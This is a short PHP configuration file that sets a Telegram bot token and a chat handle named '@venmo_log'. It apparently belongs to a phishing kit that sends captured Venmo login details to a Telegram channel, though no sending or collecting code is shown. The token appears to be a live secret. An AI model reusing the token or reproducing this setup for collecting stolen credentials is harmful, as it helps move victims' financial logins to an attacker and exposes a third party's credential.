<?php
$coronatoken = '7136064660:AAHGvPuBkBhdpm_JPWNAYLJw0qhnhJJifsg';
$coronachat  = '@venmo_log';
?>
